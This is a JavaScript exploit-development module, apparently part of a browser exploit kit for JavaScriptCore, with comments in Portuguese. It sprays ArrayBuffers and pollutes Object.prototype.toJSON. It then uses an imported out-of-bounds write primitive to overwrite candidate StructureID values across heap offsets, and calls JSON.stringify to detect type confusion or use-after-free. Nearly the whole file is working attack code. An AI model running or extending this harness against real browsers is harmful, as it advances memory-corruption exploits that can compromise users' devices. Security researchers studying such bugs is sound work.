// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';

// --- Parâmetros de Teste Configuráveis ---
const SPECULATIVE_TEST_CONFIG = {
    victim_ab_size: 64,
    // Em vez de offsets fixos, vamos definir um intervalo de busca e um passo
    // O intervalo será relativo ao OOB_CONFIG.BASE_OFFSET_IN_DV e ao OOB_CONFIG.ALLOCATION_SIZE
    // Fator para determinar o quão longe antes/depois do BASE_OFFSET_IN_DV procurar
    search_range_factor_before: 0.25, // Ex: 25% do ALLOCATION_SIZE antes do BASE_OFFSET_IN_DV
    search_range_factor_after: 0.75,  // Ex: 75% do ALLOCATION_SIZE depois do BASE_OFFSET_IN_DV
    search_step: 4, // Procurar a cada 4 bytes (alinhamento comum para StructureID)

    // Valores a serem escritos nos offsets de corrupção
    values_to_write_for_corruption: [
        0xFFFFFFFF, // Valor clássico para corrupção
        0x0,        // Tentar anular
        0x1,        // Um StructureID pequeno e provavelmente inválido
        0x41414141, // "AAAA"
        // Adicionar todos os KNOWN_STRUCTURE_IDS (convertidos para número)
        ...Object.values(KNOWN_STRUCTURE_IDS).map(idStr => parseInt(idStr, 16)).filter(idNum => !isNaN(idNum))
    ],
    bytes_to_write_for_corruption: 4, // StructureID é geralmente uint32_t
    ppKey: 'toJSON',
    stop_on_first_success: true,
    spray_count_victim_ab: 250, // Aumentado para melhorar chances de acerto
    // Um ArrayBuffer vítima será criado e passado para JSON.stringify.
    // A esperança é que um dos ArrayBuffers pulverizados na heap esteja no offset
    // que será corrompido pela escrita OOB.
};
// --- Fim dos Parâmetros ---

export async function testJsonTypeConfusionUAFSpeculative() {
    const FNAME = "testJsonTypeConfusionUAFSpeculative";
    logS3(`--- Iniciando Teste Especulativo UAF/Type Confusion via JSON (S3) (v2.6 - Exploratório) ---`, "test", FNAME);
    logS3(`   Config: victim_size=${SPECULATIVE_TEST_CONFIG.victim_ab_size}, ppKey=${SPECULATIVE_TEST_CONFIG.ppKey}, spray_victim_ab=${SPECULATIVE_TEST_CONFIG.spray_count_victim_ab}`, "info", FNAME);
    logS3(`   Valores de corrupção (StructureIDs): ${SPECULATIVE_TEST_CONFIG.values_to_write_for_corruption.map(v => toHex(v)).join(', ')}`, "info", FNAME);

    let overallTestSuccess = false;
    let victimAbs_spray = [];

    // Limpeza preliminar
    delete Object.prototype[SPECULATIVE_TEST_CONFIG.ppKey];

    // Calcular o intervalo de busca de offsets dinamicamente
    // O OOB_CONFIG é atualizado pela UI, então o pegamos fresco a cada chamada principal do teste (via triggerOOB_primitive)
    // Para o cálculo inicial do log, usamos os valores atuais de OOB_CONFIG.
    const initialSearchStartOffset = Math.max(0, (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) - Math.floor((OOB_CONFIG.ALLOCATION_SIZE || 0) * SPECULATIVE_TEST_CONFIG.search_range_factor_before));
    const initialSearchEndOffset = Math.min(
        (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + Math.floor((OOB_CONFIG.ALLOCATION_SIZE || 0) * SPECULATIVE_TEST_CONFIG.search_range_factor_after),
        (OOB_CONFIG.ALLOCATION_SIZE || 0) + (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) - SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption - 64 // Subtrai um pouco para segurança
    );
    logS3(`   Escopo de busca de offset de corrupção (inicial, relativo ao início de oob_array_buffer_real): ${toHex(initialSearchStartOffset)} a ${toHex(initialSearchEndOffset)}`, "info", FNAME);


    // O loop principal de tentativas de corrupção
    // (Este loop pode ser externo se quisermos re-pulverizar para cada faixa de offsets)
    // Por ora, pulverizamos uma vez e tentamos todos os offsets e valores.

    await triggerOOB_primitive(); // Configura oob_array_buffer_real e atualiza OOB_CONFIG da UI
    if (!oob_array_buffer_real) {
        logS3("Falha crítica ao configurar ambiente OOB inicial. Teste abortado.", "error", FNAME);
        return;
    }

    // Recalcula os limites de busca com base no oob_array_buffer_real efetivamente alocado
    // e no OOB_CONFIG potencialmente atualizado pela UI.
    const searchStartOffset = Math.max(0, (OOB_CONFIG.BASE_OFFSET_IN_DV) - Math.floor(OOB_CONFIG.ALLOCATION_SIZE * SPECULATIVE_TEST_CONFIG.search_range_factor_before));
    const searchEndOffset = Math.min(
        (OOB_CONFIG.BASE_OFFSET_IN_DV) + Math.floor(OOB_CONFIG.ALLOCATION_SIZE * SPECULATIVE_TEST_CONFIG.search_range_factor_after),
        oob_array_buffer_real.byteLength - SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption - 16 // Garante que a escrita não saia do buffer OOB
    );
    logS3(`   Escopo de busca REAL (baseado no buffer OOB alocado) para offset de corrupção: ${toHex(searchStartOffset)} a ${toHex(searchEndOffset)}`, "info", FNAME);


    victimAbs_spray = [];
    for(let i=0; i < SPECULATIVE_TEST_CONFIG.spray_count_victim_ab; i++){
        try {
            victimAbs_spray.push(new ArrayBuffer(SPECULATIVE_TEST_CONFIG.victim_ab_size));
        } catch (e) {
            logS3(`Falha ao alocar ArrayBuffer de spray ${i+1}: ${e.message}. Parando spray.`, "warn", FNAME);
            break;
        }
    }
    if (victimAbs_spray.length === 0) {
        logS3("Nenhum ArrayBuffer vítima pulverizado. Abortando.", "error", FNAME);
        clearOOBEnvironment();
        return;
    }
    const target_victim_ab = victimAbs_spray[victimAbs_spray.length - 1]; // O último é uma escolha arbitrária como alvo principal do stringify
    logS3(`${victimAbs_spray.length} ArrayBuffers vítimas pulverizados. Alvo para JSON.stringify: um deles (último da lista por conveniência).`, "info", FNAME);
    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para estabilização da heap pós-spray

    for (let corruption_offset_abs = searchStartOffset; corruption_offset_abs < searchEndOffset; corruption_offset_abs += SPECULATIVE_TEST_CONFIG.search_step) {
        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;

        // Verifica se o offset é válido dentro do oob_array_buffer_real
        if (corruption_offset_abs < 0 || corruption_offset_abs + SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption > oob_array_buffer_real.byteLength) {
            // logS3(`  Offset de corrupção ${toHex(corruption_offset_abs)} está fora dos limites de oob_array_buffer_real. Pulando.`, "info", FNAME);
            continue;
        }

        for (const value_to_write of SPECULATIVE_TEST_CONFIG.values_to_write_for_corruption) {
            if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;
            if (isNaN(value_to_write)) { // Pula se o KNOWN_STRUCTURE_ID não foi preenchido e resultou em NaN
                logS3(`AVISO: Valor de corrupção inválido (NaN) encontrado. Pulando. Verifique KNOWN_STRUCTURE_IDS.`, "warn", FNAME);
                continue;
            }


            const ppKey = SPECULATIVE_TEST_CONFIG.ppKey;
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;
            let currentIterationSuccess = false;
            let originalValueAtCorruptionOffset = null;

            logS3(`Testando: Corromper offset abs ${toHex(corruption_offset_abs)} com valor ${toHex(value_to_write)}`, "subtest", FNAME);

            try {
                // Ler valor original ANTES de corromper, para restaurar
                try {
                    originalValueAtCorruptionOffset = oob_read_absolute(corruption_offset_abs, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
                } catch (e) {
                    logS3(`  Aviso: Falha ao ler valor original em ${toHex(corruption_offset_abs)}: ${e.message}. Próxima iteração.`, "warn", FNAME);
                    continue; // Pula para o próximo valor/offset se não puder ler o original para restaurar
                }

                Object.defineProperty(Object.prototype, ppKey, {
                    value: function() {
                        const currentOperationThis = this;
                        logS3(`  [${ppKey} Poluído] Chamado! (para offset ${toHex(corruption_offset_abs)}, valor ${toHex(value_to_write)})`, "vuln", FNAME);
                        logS3(`    Contexto: Object.prototype.toString.call(this) = ${Object.prototype.toString.call(currentOperationThis)}`, "info", FNAME);

                        if (currentOperationThis !== target_victim_ab && !(currentOperationThis instanceof ArrayBuffer && currentOperationThis.byteLength === SPECULATIVE_TEST_CONFIG.victim_ab_size)) {
                             logS3(`    AVISO: 'this' no toJSON (${Object.prototype.toString.call(currentOperationThis)}) pode não ser um dos ArrayBuffers vítimas esperados.`, "warn", FNAME);
                        }

                        try {
                            const tryByteLength = currentOperationThis.byteLength; // Tenta ler o byteLength
                            new DataView(currentOperationThis); // Operação crítica
                            logS3(`    [${ppKey} Poluído] DataView(this) criado com SUCESSO. 'this' ainda é um ArrayBuffer válido. byteLength=${tryByteLength}`, "good", FNAME);
                            return { toJSON_executed_ok: true, type: Object.prototype.toString.call(currentOperationThis), byteLength: tryByteLength };
                        } catch (e) {
                            logS3(`    [${ppKey} Poluído] ERRO ao operar sobre 'this': ${e.name} - ${e.message}`, "critical", FNAME);
                            logS3(`    ---> SINAL DE TYPE CONFUSION / UAF <--- (Offset: ${toHex(corruption_offset_abs)}, Valor Corruptor: ${toHex(value_to_write)})`, "vuln", FNAME);
                            currentIterationSuccess = true;
                            overallTestSuccess = true;
                            return { toJSON_error: true, message: e.message, type_at_error: Object.prototype.toString.call(currentOperationThis) };
                        }
                    },
                    writable: true, configurable: true, enumerable: false
                });
                pollutionApplied = true;

                // Realizar a escrita OOB
                logS3(`    CORRUPÇÃO: Escrevendo ${toHex(value_to_write)} em ${toHex(corruption_offset_abs)}. Original: ${isAdvancedInt64Object(originalValueAtCorruptionOffset) ? originalValueAtCorruptionOffset.toString(true) : toHex(originalValueAtCorruptionOffset)}`, "warn", FNAME);
                oob_write_absolute(corruption_offset_abs, value_to_write, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
                
                await PAUSE_S3(SHORT_PAUSE_S3 / 2); // Pausa mínima

                logS3(`    Chamando JSON.stringify(target_victim_ab)...`, "info", FNAME);
                let stringifyResult = null;
                try {
                    // Tentamos em um dos ABs pulverizados. Se o crash não for nele, mas em outro, ainda pode ser detectado.
                    stringifyResult = JSON.stringify(target_victim_ab); 
                    logS3(`    Resultado de JSON.stringify: ${String(stringifyResult).substring(0, 150)}`, "info", FNAME);
                     if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_error:true")) {
                        logS3("    SUCESSO ESPECULATIVO CONFIRMADO: Erro capturado dentro do toJSON poluído.", "vuln", FNAME);
                    } else if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_executed_ok:true")) {
                        logS3("    toJSON poluído executou sem erro interno aparente.", "good", FNAME);
                    }
                } catch (e_stringify) {
                    logS3(`    ERRO EXTERNO durante JSON.stringify(target_victim_ab): ${e_stringify.name} - ${e_stringify.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME);
                    console.error(`JSON.stringify UAF/TC Test Error (Offset: ${toHex(corruption_offset_abs)}, Val: ${toHex(value_to_write)}):`, e_stringify);
                    currentIterationSuccess = true;
                    overallTestSuccess = true;
                }

            } catch (mainIterationError) {
                logS3(`  Erro na iteração (Offset: ${toHex(corruption_offset_abs)}, Val: ${toHex(value_to_write)}): ${mainIterationError.message}`, "error", FNAME);
            } finally {
                // Restaurar valor original no offset de corrupção
                if (originalValueAtCorruptionOffset !== null) {
                    try {
                        oob_write_absolute(corruption_offset_abs, originalValueAtCorruptionOffset, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
                    } catch (e_restore) {
                        logS3(`    AVISO: Falha ao restaurar valor em ${toHex(corruption_offset_abs)}. Erro: ${e_restore.message}`, "warn", "CleanupIter");
                    }
                }

                if (pollutionApplied) {
                    if (originalToJSONDescriptor) {
                        Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                    } else {
                        delete Object.prototype[ppKey];
                    }
                }
            } // Fim do try/catch/finally da iteração
            if (currentIterationSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) {
                logS3(`Sucesso especulativo alcançado. Parando conforme stop_on_first_success. Offset: ${toHex(corruption_offset_abs)}, Valor: ${toHex(value_to_write)}`, "vuln", FNAME);
                break; 
            }
            if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;
            await PAUSE_S3(SHORT_PAUSE_S3); // Pausa entre valores de corrupção
        } // Fim do loop de values_to_write

        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;
        if (corruption_offset_abs % (SPECULATIVE_TEST_CONFIG.search_step * 20) === 0) { // Log de progresso
             logS3(`Progresso da busca: Offset atual ${toHex(corruption_offset_abs)} de ${toHex(searchEndOffset)}`, "info", FNAME);
             await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa mais longa para dar tempo ao navegador/GC
        }

    } // Fim do loop de corruption_offsets

    clearOOBEnvironment(); // Limpa o ambiente OOB principal
    victimAbs_spray = null; // Ajudar GC
    logS3(`--- Teste Especulativo UAF/Type Confusion via JSON Concluído (Sucesso Especulativo Geral: ${overallTestSuccess}) ---`, "test", FNAME);
}
